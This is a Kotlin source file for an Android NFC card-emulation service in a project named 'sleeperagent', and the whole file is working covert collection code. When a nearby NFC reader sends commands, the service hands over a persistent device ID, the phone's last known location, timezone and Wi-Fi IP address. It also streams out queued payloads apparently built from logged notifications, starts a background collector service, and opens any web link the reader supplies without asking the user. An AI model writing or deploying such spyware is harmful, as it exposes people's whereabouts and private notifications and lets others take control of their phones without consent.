package com.ponleou.sleeperagent

import android.Manifest
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.nfc.cardemulation.HostApduService
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat
import java.util.Locale
import java.util.TimeZone
import java.security.SecureRandom
import kotlin.math.min

class HceService : HostApduService() {
    private var activePayload: PendingPayload? = null
    private var activeOffset: Int = 0
    private val idleHandler = Handler(Looper.getMainLooper())
    private val idleTimeoutRunnable = Runnable { stopCollector() }

    override fun processCommandApdu(commandApdu: ByteArray, extras: Bundle?): ByteArray {
        if (isSelectAid(commandApdu)) {
            stopCollector()
            return NfcApdu.SW_SUCCESS
        }

        if (isIdentifyCommand(commandApdu)) {
            stopCollector()
            val deviceId = getStoredDeviceId().toByteArray(Charsets.US_ASCII)
            return deviceId + NfcApdu.SW_SUCCESS
        }

        if (isStartCollectorCommand(commandApdu)) {
            startCollector()
            return NfcApdu.SW_SUCCESS
        }

        if (isStopCollectorCommand(commandApdu)) {
            stopCollector()
            return NfcApdu.SW_SUCCESS
        }

        if (isOpenWeblinkCommand(commandApdu)) {
            val link = parseWeblink(commandApdu)
            val launched = link != null && openWeblink(link)
            return if (launched) NfcApdu.SW_SUCCESS else NfcApdu.SW_UNKNOWN
        }

        if (isCollectMetadataCommand(commandApdu)) {
            val payload = buildMetadataPayload()
            return payload + NfcApdu.SW_SUCCESS
        }

        if (isPollCommand(commandApdu)) {
            if (!CollectorControl.isEnabled()) {
                return NfcApdu.SW_SUCCESS
            }
            recordCollectorActivity()
            return buildPollResponse()
        }

        if (isCollectCommand(commandApdu)) {
            if (!CollectorControl.isEnabled()) {
                return NfcApdu.SW_UNKNOWN
            }
            recordCollectorActivity()
            return buildCollectResponse()
        }

        return NfcApdu.SW_UNKNOWN
    }

    override fun onDeactivated(reason: Int) {
        stopCollector()
    }

    private fun isSelectAid(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 6) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF
        if (cla != NfcApdu.CLA_STANDARD || ins != NfcApdu.INS_SELECT || p1 != NfcApdu.P1_SELECT_BY_AID || p2 != NfcApdu.P2_FIRST_OR_ONLY) {
            return false
        }

        val lc = commandApdu[4].toInt() and 0xFF
        if (commandApdu.size < 5 + lc) {
            return false
        }

        val aidSlice = commandApdu.copyOfRange(5, 5 + lc)
        return aidSlice.contentEquals(NfcApdu.AID_SLEEPER_AGENT)
    }

    private fun isIdentifyCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 5) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF

        return cla == NfcApdu.CLA_PROPRIETARY &&
            ins == NfcApdu.INS_IDENTIFY &&
            p1 == NfcApdu.P_NULL &&
            p2 == NfcApdu.P_NULL
    }

    private fun isPollCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 4) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF

        return cla == NfcApdu.CLA_PROPRIETARY &&
            ins == NfcApdu.INS_POLL &&
            p1 == NfcApdu.P_NULL &&
            p2 == NfcApdu.P_NULL
    }

    private fun isCollectCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 4) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF

        return cla == NfcApdu.CLA_PROPRIETARY &&
            ins == NfcApdu.INS_COLLECT &&
            p1 == NfcApdu.P1_COLLECT_PROVIDE_LENGTH &&
            p2 == NfcApdu.P2_COLLECT_LENGTH_POS
    }

    private fun isStartCollectorCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 4) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF

        return cla == NfcApdu.CLA_PROPRIETARY &&
            ins == NfcApdu.INS_START_CLIENT_COLLECTOR &&
            p1 == NfcApdu.P_NULL &&
            p2 == NfcApdu.P_NULL
    }

    private fun isStopCollectorCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 4) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF

        return cla == NfcApdu.CLA_PROPRIETARY &&
            ins == NfcApdu.INS_STOP_CLIENT_COLLECTOR &&
            p1 == NfcApdu.P_NULL &&
            p2 == NfcApdu.P_NULL
    }

    private fun isOpenWeblinkCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 5) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF
        if (cla != NfcApdu.CLA_PROPRIETARY || ins != NfcApdu.INS_OPEN_WEBLINK || p1 != NfcApdu.P_NULL || p2 != NfcApdu.P_NULL) {
            return false
        }

        return true
    }

    private fun isCollectMetadataCommand(commandApdu: ByteArray): Boolean {
        if (commandApdu.size < 4) {
            return false
        }

        val cla = commandApdu[0].toInt() and 0xFF
        val ins = commandApdu[1].toInt() and 0xFF
        val p1 = commandApdu[2].toInt() and 0xFF
        val p2 = commandApdu[3].toInt() and 0xFF

        return cla == NfcApdu.CLA_PROPRIETARY &&
            ins == NfcApdu.INS_COLLECT_META &&
            p1 == NfcApdu.P_NULL &&
            p2 == NfcApdu.P_NULL
    }

    private fun parseWeblink(commandApdu: ByteArray): String? {
        if (commandApdu.size < 5) {
            return null
        }

        val lc = commandApdu[4].toInt() and 0xFF
        val available = commandApdu.size - 5
        val dataLength = when {
            lc == 0 -> available
            available >= lc -> lc
            available > 0 -> available
            else -> 0
        }
        if (dataLength <= 0) {
            return null
        }

        val linkBytes = commandApdu.copyOfRange(5, 5 + dataLength)
        val link = linkBytes.toString(Charsets.UTF_8).trim()
        return if (link.isBlank()) null else link
    }

    private fun openWeblink(rawLink: String): Boolean {
        val trimmed = rawLink.trim()
        if (trimmed.isBlank()) {
            return false
        }

        val normalized = if (trimmed.contains("://")) trimmed else "http://$trimmed"
        val uri = Uri.parse(normalized)
        val intent = Intent(Intent.ACTION_VIEW, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        
        Handler(Looper.getMainLooper()).post {
            try {
                startActivity(intent)
            } catch (ex: Exception) {
                // Ignore launch failures; NFC response already sent.
            }
        }
        return true
    }

    private fun buildMetadataPayload(): ByteArray {
        val location = getLastKnownLocation()
        val lat = location?.latitude?.let { formatCoordinate(it) } ?: "unknown"
        val lon = location?.longitude?.let { formatCoordinate(it) } ?: "unknown"
        val timezone = TimeZone.getDefault().id
        val wifiIp = getWifiIpAddress() ?: "unknown"
        val payload = listOf(lat, lon, timezone, wifiIp).joinToString("\u0000")
        val payloadBytes = payload.toByteArray(Charsets.UTF_8)
        val maxBytes = NfcApdu.MAX_APDU_RESPONSE_BYTES - NfcApdu.SW_SUCCESS.size
        return if (payloadBytes.size <= maxBytes) payloadBytes else payloadBytes.copyOf(maxBytes)
    }

    private fun getLastKnownLocation(): Location? {
        if (!hasLocationPermission()) {
            return null
        }

        val manager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return null
        val providers = listOf(
            LocationManager.GPS_PROVIDER,
            LocationManager.NETWORK_PROVIDER,
            LocationManager.PASSIVE_PROVIDER
        )

        var best: Location? = null
        for (provider in providers) {
            val location = try {
                manager.getLastKnownLocation(provider)
            } catch (ex: SecurityException) {
                null
            }

            if (location != null && (best == null || location.accuracy < best!!.accuracy)) {
                best = location
            }
        }

        return best
    }

    private fun hasLocationPermission(): Boolean {
        val fine = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarse = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    private fun getWifiIpAddress(): String? {
        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            ?: return null
        val ipAddress = wifiManager.connectionInfo?.ipAddress ?: 0
        if (ipAddress == 0) {
            return null
        }

        return String.format(
            Locale.US,
            "%d.%d.%d.%d",
            ipAddress and 0xFF,
            ipAddress shr 8 and 0xFF,
            ipAddress shr 16 and 0xFF,
            ipAddress shr 24 and 0xFF
        )
    }

    private fun formatCoordinate(value: Double): String {
        return String.format(Locale.US, "%.5f", value)
    }

    private fun buildPollResponse(): ByteArray {
        return if (hasPendingPayload()) NfcApdu.SW_DATA else NfcApdu.SW_SUCCESS
    }

    private fun hasPendingPayload(): Boolean {
        val active = activePayload
        if (active != null) {
            if (activeOffset < active.payload.size) {
                return true
            }
            clearActivePayload()
        }

        return NotificationLogRepository.hasPendingPayload()
    }

    private fun buildCollectResponse(): ByteArray {
         val payload = loadActivePayload() ?: return byteArrayOf(0x00.toByte()) + NfcApdu.SW_SUCCESS
        val remaining = payload.payload.size - activeOffset
        if (remaining <= 0) {
            clearActivePayload()
            return byteArrayOf(0x00.toByte()) + NfcApdu.SW_SUCCESS
        }

        val chunkSize = min(remaining, NfcApdu.MAX_COLLECT_DATA_BYTES)
        val chunk = payload.payload.copyOfRange(activeOffset, activeOffset + chunkSize)
        activeOffset += chunkSize

        val hasMore = activeOffset < payload.payload.size
        if (!hasMore) {
            clearActivePayload()
        }

        val response = ByteArray(1 + chunk.size)
        response[0] = (chunkSize and 0xFF).toByte()
        System.arraycopy(chunk, 0, response, 1, chunk.size)
        return response + if (hasMore) NfcApdu.SW_DATA else NfcApdu.SW_SUCCESS
    }

    private fun loadActivePayload(): PendingPayload? {
        val active = activePayload
        if (active != null) {
            return active
        }

        val next = NotificationLogRepository.peekPendingPayload() ?: return null
        activePayload = next
        activeOffset = 0
        return next
    }

    private fun clearActivePayload() {
        if (activePayload != null) {
            NotificationLogRepository.popPendingPayload()
        }
        activePayload = null
        activeOffset = 0
    }

    private fun startCollector() {
        val wasEnabled = CollectorControl.isEnabled()
        recordCollectorActivity()
        if (!wasEnabled) {
            val intent = Intent(this, CollectorForegroundService::class.java)
            ContextCompat.startForegroundService(this, intent)
        }
    }

    private fun stopCollector() {
        CollectorControl.setEnabled(false)
        idleHandler.removeCallbacks(idleTimeoutRunnable)
        stopService(Intent(this, CollectorForegroundService::class.java))
        activePayload = null
        activeOffset = 0
    }

    private fun recordCollectorActivity() {
        CollectorControl.recordActivity(IDLE_TIMEOUT_MS)
        idleHandler.removeCallbacks(idleTimeoutRunnable)
        idleHandler.postDelayed(idleTimeoutRunnable, IDLE_TIMEOUT_MS)
    }

    private fun getStoredDeviceId(): String {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val existing = prefs.getString(PREF_DEVICE_ID, null)
        if (!existing.isNullOrBlank()) {
            return existing
        }

        val generated = generateNanoId(DEVICE_ID_LENGTH)
        prefs.edit().putString(PREF_DEVICE_ID, generated).apply()
        return generated
    }

    private fun generateNanoId(length: Int): String {
        val buffer = CharArray(length)
        for (index in 0 until length) {
            buffer[index] = NANOID_ALPHABET[SECURE_RANDOM.nextInt(NANOID_ALPHABET.size)]
        }
        return String(buffer)
    }

    companion object {
        private const val IDLE_TIMEOUT_MS = 10 * 1000L // 10 seconds
        private const val PREFS_NAME = "sleeper_agent_prefs"
        private const val PREF_DEVICE_ID = "device_id"
        private const val DEVICE_ID_LENGTH = 6

        private val SECURE_RANDOM = SecureRandom()
        private val NANOID_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".toCharArray()
    }
}
